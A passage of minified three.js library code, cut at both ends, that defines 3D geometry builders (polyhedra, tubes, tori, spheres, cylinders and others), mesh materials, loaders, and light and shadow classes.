THREE.DepthFormat or THREE.DepthStencilFormat\");void 0===c&&1026===k&&(c=1012);void 0===c&&1027===k&&(c=1020);ea.call(this,null,d,e,f,g,h,k,c,m);this.image={width:a,height:b};this.magFilter=void 0!==g?g:1003;this.minFilter=void 0!==h?h:1003;this.generateMipmaps=this.flipY=!1}function Ob(a){function b(a,b){return a-b}I.call(this);this.type=\"WireframeGeometry\";var c=[],d,e,f,g,h=[0,0],m={},k,t=[\"a\",\"b\",\n\"c\"];if(a&&a.isGeometry){var p=a.faces;d=0;for(f=p.length;d<f;d++){var n=p[d];for(e=0;3>e;e++)h[0]=n[t[e]],h[1]=n[t[(e+1)%3]],h.sort(b),k=h.toString(),void 0===m[k]&&(m[k]={index1:h[0],index2:h[1]})}for(k in m)d=m[k],t=a.vertices[d.index1],c.push(t.x,t.y,t.z),t=a.vertices[d.index2],c.push(t.x,t.y,t.z)}else if(a&&a.isBufferGeometry){var l,t=new q;if(null!==a.index){p=a.attributes.position;n=a.index;l=a.groups;0===l.length&&a.addGroup(0,n.count);a=0;for(g=l.length;a<g;++a)for(d=l[a],e=d.start,f=d.count,\nd=e,f=e+f;d<f;d+=3)for(e=0;3>e;e++)h[0]=n.getX(d+e),h[1]=n.getX(d+(e+1)%3),h.sort(b),k=h.toString(),void 0===m[k]&&(m[k]={index1:h[0],index2:h[1]});for(k in m)d=m[k],t.fromBufferAttribute(p,d.index1),c.push(t.x,t.y,t.z),t.fromBufferAttribute(p,d.index2),c.push(t.x,t.y,t.z)}else for(p=a.attributes.position,d=0,f=p.count/3;d<f;d++)for(e=0;3>e;e++)m=3*d+e,t.fromBufferAttribute(p,m),c.push(t.x,t.y,t.z),m=3*d+(e+1)%3,t.fromBufferAttribute(p,m),c.push(t.x,t.y,t.z)}this.addAttribute(\"position\",new z(c,3))}\nfunction Hc(a,b,c){T.call(this);this.type=\"ParametricGeometry\";this.parameters={func:a,slices:b,stacks:c};this.fromBufferGeometry(new Pb(a,b,c));this.mergeVertices()}function Pb(a,b,c){I.call(this);this.type=\"ParametricBufferGeometry\";this.parameters={func:a,slices:b,stacks:c};var d=[],e=[],f=[],g,h,m=b+1;for(g=0;g<=c;g++){var k=g/c;for(h=0;h<=b;h++){var t=h/b,p=a(t,k);e.push(p.x,p.y,p.z);f.push(t,k)}}for(g=0;g<c;g++)for(h=0;h<b;h++)a=g*m+h+1,k=(g+1)*m+h+1,t=(g+1)*m+h,d.push(g*m+h,a,t),d.push(a,k,\nt);this.setIndex(d);this.addAttribute(\"position\",new z(e,3));this.addAttribute(\"uv\",new z(f,2));this.computeVertexNormals()}function Ic(a,b,c,d){T.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};this.fromBufferGeometry(new Ba(a,b,c,d));this.mergeVertices()}function Ba(a,b,c,d){function e(a){h.push(a.x,a.y,a.z)}function f(b,c){var d=3*b;c.x=a[d+0];c.y=a[d+1];c.z=a[d+2]}function g(a,b,c,d){0>d&&1===a.x&&(m[b]=a.x-1);0===c.x&&0===c.z&&(m[b]=d/2/Math.PI+\n.5)}I.call(this);this.type=\"PolyhedronBufferGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;var h=[],m=[];(function(a){for(var c=new q,d=new q,g=new q,h=0;h<b.length;h+=3){f(b[h+0],c);f(b[h+1],d);f(b[h+2],g);var m=c,l=d,A=g,w=Math.pow(2,a),y=[],K,v;for(K=0;K<=w;K++){y[K]=[];var E=m.clone().lerp(A,K/w),L=l.clone().lerp(A,K/w),C=w-K;for(v=0;v<=C;v++)y[K][v]=0===v&&K===w?E:E.clone().lerp(L,v/C)}for(K=0;K<w;K++)for(v=0;v<2*(w-K)-1;v++)m=Math.floor(v/2),0===v%2?(e(y[K][m+1]),\ne(y[K+1][m]),e(y[K][m])):(e(y[K][m+1]),e(y[K+1][m+1]),e(y[K+1][m]))}})(d||0);(function(a){for(var b=new q,c=0;c<h.length;c+=3)b.x=h[c+0],b.y=h[c+1],b.z=h[c+2],b.normalize().multiplyScalar(a),h[c+0]=b.x,h[c+1]=b.y,h[c+2]=b.z})(c);(function(){for(var a=new q,b=0;b<h.length;b+=3)a.x=h[b+0],a.y=h[b+1],a.z=h[b+2],m.push(Math.atan2(a.z,-a.x)/2/Math.PI+.5,1-(Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5));for(var a=new q,b=new q,c=new q,d=new q,e=new D,f=new D,l=new D,A=0,w=0;A<h.length;A+=9,w+=\n6){a.set(h[A+0],h[A+1],h[A+2]);b.set(h[A+3],h[A+4],h[A+5]);c.set(h[A+6],h[A+7],h[A+8]);e.set(m[w+0],m[w+1]);f.set(m[w+2],m[w+3]);l.set(m[w+4],m[w+5]);d.copy(a).add(b).add(c).divideScalar(3);var y=Math.atan2(d.z,-d.x);g(e,w+0,a,y);g(f,w+2,b,y);g(l,w+4,c,y)}for(a=0;a<m.length;a+=6)b=m[a+0],c=m[a+2],d=m[a+4],e=Math.min(b,c,d),.9<Math.max(b,c,d)&&.1>e&&(.2>b&&(m[a+0]+=1),.2>c&&(m[a+2]+=1),.2>d&&(m[a+4]+=1))})();this.addAttribute(\"position\",new z(h,3));this.addAttribute(\"normal\",new z(h.slice(),3));this.addAttribute(\"uv\",\nnew z(m,2));this.normalizeNormals()}function Jc(a,b){T.call(this);this.type=\"TetrahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Qb(a,b));this.mergeVertices()}function Qb(a,b){Ba.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\"TetrahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Kc(a,b){T.call(this);this.type=\"OctahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new ob(a,b));this.mergeVertices()}\nfunction ob(a,b){Ba.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\"OctahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Lc(a,b){T.call(this);this.type=\"IcosahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Rb(a,b));this.mergeVertices()}function Rb(a,b){var c=(1+Math.sqrt(5))/2;Ba.call(this,[-1,c,0,1,c,0,-1,-c,0,1,-c,0,0,-1,c,0,1,c,0,-1,-c,0,1,-c,c,0,-1,c,0,1,-c,0,-1,-c,0,1],[0,11,\n5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],a,b);this.type=\"IcosahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Mc(a,b){T.call(this);this.type=\"DodecahedronGeometry\";this.parameters={radius:a,detail:b};this.fromBufferGeometry(new Sb(a,b));this.mergeVertices()}function Sb(a,b){var c=(1+Math.sqrt(5))/2,d=1/c;Ba.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,\nd,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronBufferGeometry\";this.parameters={radius:a,detail:b}}function Nc(a,b,c,d,e,f){T.call(this);this.type=\"TubeGeometry\";this.parameters={path:a,\ntubularSegments:b,radius:c,radialSegments:d,closed:e};void 0!==f&&console.warn(\"THREE.TubeGeometry: taper has been removed.\");a=new Tb(a,b,c,d,e);this.tangents=a.tangents;this.normals=a.normals;this.binormals=a.binormals;this.fromBufferGeometry(a);this.mergeVertices()}function Tb(a,b,c,d,e){function f(e){var f=a.getPointAt(e/b),k=g.normals[e];e=g.binormals[e];for(p=0;p<=d;p++){var t=p/d*Math.PI*2,r=Math.sin(t),t=-Math.cos(t);m.x=t*k.x+r*e.x;m.y=t*k.y+r*e.y;m.z=t*k.z+r*e.z;m.normalize();l.push(m.x,\nm.y,m.z);h.x=f.x+c*m.x;h.y=f.y+c*m.y;h.z=f.z+c*m.z;n.push(h.x,h.y,h.z)}}I.call(this);this.type=\"TubeBufferGeometry\";this.parameters={path:a,tubularSegments:b,radius:c,radialSegments:d,closed:e};b=b||64;c=c||1;d=d||8;e=e||!1;var g=a.computeFrenetFrames(b,e);this.tangents=g.tangents;this.normals=g.normals;this.binormals=g.binormals;var h=new q,m=new q,k=new D,t,p,n=[],l=[],G=[],r=[];for(t=0;t<b;t++)f(t);f(!1===e?b:0);for(t=0;t<=b;t++)for(p=0;p<=d;p++)k.x=t/b,k.y=p/d,G.push(k.x,k.y);(function(){for(p=\n1;p<=b;p++)for(t=1;t<=d;t++){var a=(d+1)*p+(t-1),c=(d+1)*p+t,e=(d+1)*(p-1)+t;r.push((d+1)*(p-1)+(t-1),a,e);r.push(a,c,e)}})();this.setIndex(r);this.addAttribute(\"position\",new z(n,3));this.addAttribute(\"normal\",new z(l,3));this.addAttribute(\"uv\",new z(G,2))}function Oc(a,b,c,d,e,f,g){T.call(this);this.type=\"TorusKnotGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void 0!==g&&console.warn(\"THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead.\");\nthis.fromBufferGeometry(new Ub(a,b,c,d,e,f));this.mergeVertices()}function Ub(a,b,c,d,e,f){function g(a,b,c,d,e){var f=Math.sin(a);b=c/b*a;c=Math.cos(b);e.x=d*(2+c)*.5*Math.cos(a);e.y=d*(2+c)*f*.5;e.z=d*Math.sin(b)*.5}I.call(this);this.type=\"TorusKnotBufferGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};a=a||100;b=b||40;c=Math.floor(c)||64;d=Math.floor(d)||8;e=e||2;f=f||3;var h=[],m=[],k=[],t=[],p,n,l=new q,G=new q;new D;var r=new q,A=new q,w=new q,y=new q,K=\nnew q;for(p=0;p<=c;++p)for(n=p/c*e*Math.PI*2,g(n,e,f,a,r),g(n+.01,e,f,a,A),y.subVectors(A,r),K.addVectors(A,r),w.crossVectors(y,K),K.crossVectors(w,y),w.normalize(),K.normalize(),n=0;n<=d;++n){var v=n/d*Math.PI*2,E=-b*Math.cos(v),v=b*Math.sin(v);l.x=r.x+(E*K.x+v*w.x);l.y=r.y+(E*K.y+v*w.y);l.z=r.z+(E*K.z+v*w.z);m.push(l.x,l.y,l.z);G.subVectors(l,r).normalize();k.push(G.x,G.y,G.z);t.push(p/c);t.push(n/d)}for(n=1;n<=c;n++)for(p=1;p<=d;p++)a=(d+1)*n+(p-1),b=(d+1)*n+p,e=(d+1)*(n-1)+p,h.push((d+1)*(n-1)+\n(p-1),a,e),h.push(a,b,e);this.setIndex(h);this.addAttribute(\"position\",new z(m,3));this.addAttribute(\"normal\",new z(k,3));this.addAttribute(\"uv\",new z(t,2))}function Pc(a,b,c,d,e){T.call(this);this.type=\"TorusGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new Vb(a,b,c,d,e))}function Vb(a,b,c,d,e){I.call(this);this.type=\"TorusBufferGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||\n8;d=Math.floor(d)||6;e=e||2*Math.PI;var f=[],g=[],h=[],m=[],k=new q,t=new q,p=new q,n,l;for(n=0;n<=c;n++)for(l=0;l<=d;l++){var G=l/d*e,r=n/c*Math.PI*2;t.x=(a+b*Math.cos(r))*Math.cos(G);t.y=(a+b*Math.cos(r))*Math.sin(G);t.z=b*Math.sin(r);g.push(t.x,t.y,t.z);k.x=a*Math.cos(G);k.y=a*Math.sin(G);p.subVectors(t,k).normalize();h.push(p.x,p.y,p.z);m.push(l/d);m.push(n/c)}for(n=1;n<=c;n++)for(l=1;l<=d;l++)a=(d+1)*(n-1)+l-1,b=(d+1)*(n-1)+l,e=(d+1)*n+l,f.push((d+1)*n+l-1,a,e),f.push(a,b,e);this.setIndex(f);\nthis.addAttribute(\"position\",new z(g,3));this.addAttribute(\"normal\",new z(h,3));this.addAttribute(\"uv\",new z(m,2))}function La(a,b){\"undefined\"!==typeof a&&(T.call(this),this.type=\"ExtrudeGeometry\",a=Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())}function Qc(a,b){b=b||{};var c=b.font;if(!1===(c&&c.isFont))return console.error(\"THREE.TextGeometry: font parameter is not an instance of THREE.Font.\"),new T;c=c.generateShapes(a,b.size,b.curveSegments);b.amount=void 0!==b.height?\nb.height:50;void 0===b.bevelThickness&&(b.bevelThickness=10);void 0===b.bevelSize&&(b.bevelSize=8);void 0===b.bevelEnabled&&(b.bevelEnabled=!1);La.call(this,c,b);this.type=\"TextGeometry\"}function Rc(a,b,c,d,e,f,g){T.call(this);this.type=\"SphereGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new pb(a,b,c,d,e,f,g))}function pb(a,b,c,d,e,f,g){I.call(this);this.type=\"SphereBufferGeometry\";this.parameters={radius:a,\nwidthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void 0!==d?d:0;e=void 0!==e?e:2*Math.PI;f=void 0!==f?f:0;g=void 0!==g?g:Math.PI;var h=f+g,m,k,t=0,p=[],n=new q,l=new q,G=[],r=[],A=[],w=[];for(k=0;k<=c;k++){var y=[],K=k/c;for(m=0;m<=b;m++){var v=m/b;n.x=-a*Math.cos(d+v*e)*Math.sin(f+K*g);n.y=a*Math.cos(f+K*g);n.z=a*Math.sin(d+v*e)*Math.sin(f+K*g);r.push(n.x,n.y,n.z);l.set(n.x,n.y,n.z).normalize();\nA.push(l.x,l.y,l.z);w.push(v,1-K);y.push(t++)}p.push(y)}for(k=0;k<c;k++)for(m=0;m<b;m++)a=p[k][m+1],d=p[k][m],e=p[k+1][m],g=p[k+1][m+1],(0!==k||0<f)&&G.push(a,d,g),(k!==c-1||h<Math.PI)&&G.push(d,e,g);this.setIndex(G);this.addAttribute(\"position\",new z(r,3));this.addAttribute(\"normal\",new z(A,3));this.addAttribute(\"uv\",new z(w,2))}function Sc(a,b,c,d,e,f){T.call(this);this.type=\"RingGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new Wb(a,\nb,c,d,e,f))}function Wb(a,b,c,d,e,f){I.call(this);this.type=\"RingBufferGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void 0!==e?e:0;f=void 0!==f?f:2*Math.PI;c=void 0!==c?Math.max(3,c):8;d=void 0!==d?Math.max(1,d):1;var g=[],h=[],m=[],k=[],t=a,p=(b-a)/d,n=new q,l=new D,G,r;for(G=0;G<=d;G++){for(r=0;r<=c;r++)a=e+r/c*f,n.x=t*Math.cos(a),n.y=t*Math.sin(a),h.push(n.x,n.y,n.z),m.push(0,0,1),l.x=(n.x/b+1)/2,l.y=(n.y/b+1)/\n2,k.push(l.x,l.y);t+=p}for(G=0;G<d;G++)for(b=G*(c+1),r=0;r<c;r++)a=r+b,e=a+c+1,f=a+c+2,t=a+1,g.push(a,e,t),g.push(e,f,t);this.setIndex(g);this.addAttribute(\"position\",new z(h,3));this.addAttribute(\"normal\",new z(m,3));this.addAttribute(\"uv\",new z(k,2))}function Tc(a,b,c,d){T.call(this);this.type=\"LatheGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new Xb(a,b,c,d));this.mergeVertices()}function Xb(a,b,c,d){I.call(this);this.type=\"LatheBufferGeometry\";\nthis.parameters={points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=N.clamp(d,0,2*Math.PI);var e=[],f=[],g=[],h=1/b,m=new q,k=new D,t,p;for(t=0;t<=b;t++){p=c+t*h*d;var n=Math.sin(p),l=Math.cos(p);for(p=0;p<=a.length-1;p++)m.x=a[p].x*n,m.y=a[p].y,m.z=a[p].x*l,f.push(m.x,m.y,m.z),k.x=t/b,k.y=p/(a.length-1),g.push(k.x,k.y)}for(t=0;t<b;t++)for(p=0;p<a.length-1;p++)c=p+t*a.length,h=c+a.length,m=c+a.length+1,k=c+1,e.push(c,h,k),e.push(h,m,k);this.setIndex(e);this.addAttribute(\"position\",\nnew z(f,3));this.addAttribute(\"uv\",new z(g,2));this.computeVertexNormals();if(d===2*Math.PI)for(d=this.attributes.normal.array,e=new q,f=new q,g=new q,c=b*a.length*3,p=t=0;t<a.length;t++,p+=3)e.x=d[p+0],e.y=d[p+1],e.z=d[p+2],f.x=d[c+p+0],f.y=d[c+p+1],f.z=d[c+p+2],g.addVectors(e,f).normalize(),d[p+0]=d[c+p+0]=g.x,d[p+1]=d[c+p+1]=g.y,d[p+2]=d[c+p+2]=g.z}function Yb(a,b){T.call(this);this.type=\"ShapeGeometry\";\"object\"===typeof b&&(console.warn(\"THREE.ShapeGeometry: Options parameter has been removed.\"),\nb=b.curveSegments);this.parameters={shapes:a,curveSegments:b};this.fromBufferGeometry(new Zb(a,b));this.mergeVertices()}function Zb(a,b){function c(a){var c,h,k=e.length/3;a=a.extractPoints(b);var l=a.shape,r=a.holes;if(!1===Ia.isClockWise(l))for(l=l.reverse(),a=0,c=r.length;a<c;a++)h=r[a],!0===Ia.isClockWise(h)&&(r[a]=h.reverse());var q=Ia.triangulateShape(l,r);a=0;for(c=r.length;a<c;a++)h=r[a],l=l.concat(h);a=0;for(c=l.length;a<c;a++)h=l[a],e.push(h.x,h.y,0),f.push(0,0,1),g.push(h.x,h.y);a=0;for(c=\nq.length;a<c;a++)l=q[a],d.push(l[0]+k,l[1]+k,l[2]+k),m+=3}I.call(this);this.type=\"ShapeBufferGeometry\";this.parameters={shapes:a,curveSegments:b};b=b||12;var d=[],e=[],f=[],g=[],h=0,m=0;if(!1===Array.isArray(a))c(a);else for(var k=0;k<a.length;k++)c(a[k]),this.addGroup(h,m,k),h+=m,m=0;this.setIndex(d);this.addAttribute(\"position\",new z(e,3));this.addAttribute(\"normal\",new z(f,3));this.addAttribute(\"uv\",new z(g,2))}function $b(a,b){function c(a,b){return a-b}I.call(this);this.type=\"EdgesGeometry\";\nthis.parameters={thresholdAngle:b};var d=[],e=Math.cos(N.DEG2RAD*(void 0!==b?b:1)),f=[0,0],g={},h,m=[\"a\",\"b\",\"c\"],k;a.isBufferGeometry?(k=new T,k.fromBufferGeometry(a)):k=a.clone();k.mergeVertices();k.computeFaceNormals();var t=k.vertices;k=k.faces;for(var p=0,n=k.length;p<n;p++)for(var l=k[p],q=0;3>q;q++)f[0]=l[m[q]],f[1]=l[m[(q+1)%3]],f.sort(c),h=f.toString(),void 0===g[h]?g[h]={index1:f[0],index2:f[1],face1:p,face2:void 0}:g[h].face2=p;for(h in g)if(f=g[h],void 0===f.face2||k[f.face1].normal.dot(k[f.face2].normal)<=\ne)m=t[f.index1],d.push(m.x,m.y,m.z),m=t[f.index2],d.push(m.x,m.y,m.z);this.addAttribute(\"position\",new z(d,3))}function qb(a,b,c,d,e,f,g,h){T.call(this);this.type=\"CylinderGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new Va(a,b,c,d,e,f,g,h));this.mergeVertices()}function Va(a,b,c,d,e,f,g,h){function m(c){var e,f,m,r=new D,C=new q,F=0,x=!0===c?a:b,H=!0===c?1:-1;f=G;for(e=1;e<=d;e++)p.push(0,\nA*H,0),n.push(0,H,0),l.push(.5,.5),G++;m=G;for(e=0;e<=d;e++){var aa=e/d*h+g,z=Math.cos(aa),aa=Math.sin(aa);C.x=x*aa;C.y=A*H;C.z=x*z;p.push(C.x,C.y,C.z);n.push(0,H,0);r.x=.5*z+.5;r.y=.5*aa*H+.5;l.push(r.x,r.y);G++}for(e=0;e<d;e++)r=f+e,C=m+e,!0===c?t.push(C,C+1,r):t.push(C+1,C,r),F+=3;k.addGroup(w,F,!0===c?1:2);w+=F}I.call(this);this.type=\"CylinderBufferGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var k=this;\na=void 0!==a?a:20;b=void 0!==b?b:20;c=void 0!==c?c:100;d=Math.floor(d)||8;e=Math.floor(e)||1;f=void 0!==f?f:!1;g=void 0!==g?g:0;h=void 0!==h?h:2*Math.PI;var t=[],p=[],n=[],l=[],G=0,r=[],A=c/2,w=0;(function(){var f,m,v=new q,E=new q,L=0,C=(b-a)/c;for(m=0;m<=e;m++){var F=[],x=m/e,H=x*(b-a)+a;for(f=0;f<=d;f++){var D=f/d,z=D*h+g,J=Math.sin(z),z=Math.cos(z);E.x=H*J;E.y=-x*c+A;E.z=H*z;p.push(E.x,E.y,E.z);v.set(J,C,z).normalize();n.push(v.x,v.y,v.z);l.push(D,1-x);F.push(G++)}r.push(F)}for(f=0;f<d;f++)for(m=\n0;m<e;m++)v=r[m+1][f],E=r[m+1][f+1],C=r[m][f+1],t.push(r[m][f],v,C),t.push(v,E,C),L+=6;k.addGroup(w,L,0);w+=L})();!1===f&&(0<a&&m(!0),0<b&&m(!1));this.setIndex(t);this.addAttribute(\"position\",new z(p,3));this.addAttribute(\"normal\",new z(n,3));this.addAttribute(\"uv\",new z(l,2))}function Uc(a,b,c,d,e,f,g){qb.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}}function Vc(a,b,c,d,e,f,g){Va.call(this,\n0,a,b,c,d,e,f,g);this.type=\"ConeBufferGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}}function Wc(a,b,c,d){T.call(this);this.type=\"CircleGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new ac(a,b,c,d))}function ac(a,b,c,d){I.call(this);this.type=\"CircleBufferGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void 0!==b?Math.max(3,b):8;c=void 0!==\nc?c:0;d=void 0!==d?d:2*Math.PI;var e=[],f=[],g=[],h=[],m,k,t=new q,p=new D;f.push(0,0,0);g.push(0,0,1);h.push(.5,.5);k=0;for(m=3;k<=b;k++,m+=3){var n=c+k/b*d;t.x=a*Math.cos(n);t.y=a*Math.sin(n);f.push(t.x,t.y,t.z);g.push(0,0,1);p.x=(f[m]/a+1)/2;p.y=(f[m+1]/a+1)/2;h.push(p.x,p.y)}for(m=1;m<=b;m++)e.push(m,m+1,0);this.setIndex(e);this.addAttribute(\"position\",new z(f,3));this.addAttribute(\"normal\",new z(g,3));this.addAttribute(\"uv\",new z(h,2))}function bc(){Ha.call(this,{uniforms:Ja.merge([V.lights,\n{opacity:{value:1}}]),vertexShader:Z.shadow_vert,fragmentShader:Z.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=a}}})}function cc(a){Ha.call(this,a);this.type=\"RawShaderMaterial\"}function Xc(a){this.uuid=N.generateUUID();this.type=\"MultiMaterial\";this.materials=Array.isArray(a)?a:[];this.visible=!0}function Qa(a){X.call(this);this.defines={STANDARD:\"\"};\nthis.type=\"MeshStandardMaterial\";this.color=new J(16777215);this.metalness=this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=\n.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)}function rb(a){Qa.call(this);this.defines={PHYSICAL:\"\"};this.type=\"MeshPhysicalMaterial\";this.reflectivity=.5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)}function Ca(a){X.call(this);this.type=\"MeshPhongMaterial\";this.color=new J(16777215);this.specular=new J(1118481);this.shininess=30;this.lightMap=this.map=null;\nthis.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.envMap=this.alphaMap=this.specularMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=\nthis.morphTargets=this.skinning=!1;this.setValues(a)}function sb(a){Ca.call(this);this.defines={TOON:\"\"};this.type=\"MeshToonMaterial\";this.gradientMap=null;this.setValues(a)}function tb(a){X.call(this,a);this.type=\"MeshNormalMaterial\";this.bumpMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new D(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.lights=this.fog=\n!1;this.setValues(a)}function ub(a){X.call(this);this.type=\"MeshLambertMaterial\";this.color=new J(16777215);this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new J(0);this.emissiveIntensity=1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=\nthis.skinning=!1;this.setValues(a)}function vb(a){X.call(this);this.type=\"LineDashedMaterial\";this.color=new J(16777215);this.scale=this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)}function $d(a,b,c){var d=this,e=!1,f=0,g=0;this.onStart=void 0;this.onLoad=a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void 0!==d.onStart)d.onStart(a,f,g);e=!0};this.itemEnd=function(a){f++;if(void 0!==d.onProgress)d.onProgress(a,f,g);if(f===g&&(e=!1,void 0!==\nd.onLoad))d.onLoad()};this.itemError=function(a){if(void 0!==d.onError)d.onError(a)}}function sa(a){this.manager=void 0!==a?a:ta}function Re(a){this.manager=void 0!==a?a:ta;this._parser=null}function ae(a){this.manager=void 0!==a?a:ta;this._parser=null}function Yc(a){this.manager=void 0!==a?a:ta}function be(a){this.manager=void 0!==a?a:ta}function td(a){this.manager=void 0!==a?a:ta}function ma(a,b){x.call(this);this.type=\"Light\";this.color=new J(a);this.intensity=void 0!==b?b:1;this.receiveShadow=\nvoid 0}function ud(a,b,c){ma.call(this,a,c);this.type=\"HemisphereLight\";this.castShadow=void 0;this.position.copy(x.DefaultUp);this.updateMatrix();this.groundColor=new J(b)}function wb(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new D(512,512);this.map=null;this.matrix=new S}function vd(){wb.call(this,new Fa(50,1,.5,500))}function wd(a,b,c,d,e,f){ma.call(this,a,b);this.type=\"SpotLight\";this.position.copy(x.DefaultUp);this.updateMatrix();this.target=new x;Object.defineProperty(this,\"power\",\n{get:function(){return this.intensity*Math.PI},set:function(a){this.intensity=a/Math.PI}});this.distance=void 0!==c?c:0;this.angle=void 0!==d?d:Math.PI/3;this.penumbra=void 0!==e?e:0;this.decay=void 0!==f?f:1;this.shadow=new vd}function xd(a,b,c,d){ma.call(this,a,b);this.type=\"PointLight\";Object.defineProperty(this,\"power\",{get:function(){return 4*this.intensity*Math.PI},set:function(a){this.intensity=a/(4*Math.PI)}});this.distance=void 0!==c?c:0;this.decay=void 0!==d?d:1;this.shadow=new wb(new Fa(90,\n1,.5,500))}function yd(){wb.call(this,new Jb(-5,5,5,-5,.5,500))}function zd(a,b){ma.call(this,a,b);this.type=\"DirectionalLight\";this.position.copy(x.DefaultUp);this.updateMatrix();this.target=new x;this.shadow=new yd}function Ad(a,b){ma.call(this,a,b);this.type=\"AmbientLight\";this.castShadow=void 0}function xa(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void 0!==d?d:new b.constructor(c);this.sampleValues=b;this.valueSize=c}function Bd(a,b,c,d){xa.call(this,a,b,c,d);this._offsetNext=\nthis._weightNext=this._offsetPrev=this._weightPrev=-0}function 